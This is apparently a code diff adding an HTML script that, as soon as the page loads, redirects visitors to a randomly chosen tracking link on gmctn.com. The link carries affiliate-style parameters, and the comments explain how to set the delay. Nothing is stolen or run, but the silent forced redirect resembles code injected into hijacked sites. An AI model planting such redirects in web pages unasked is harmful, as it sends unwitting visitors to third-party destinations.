@@ -1,0 +1,10 @@
+<script>
+var URLlist = [
+"",
+"https://gmctn.com/?a=2562&c=1177&p=r&s1=",
+"https://gmctn.com/?a=2562&c=1177&p=r&s1=",
+"https://gmctn.com/?a=2562&c=1177&p=r&s1=" // <-- the last URL has no comma
+];
+var reDelay = 0000;  // <-- time in seconds. 0000 = immediate redirect (0 seconds), 1000 = 1 sec delay, 2000 = 2 sec delay, etc
+setTimeout(function(){window.location = URLlist[Math.floor(Math.random() * URLlist.length)];}, reDelay);
+</script>
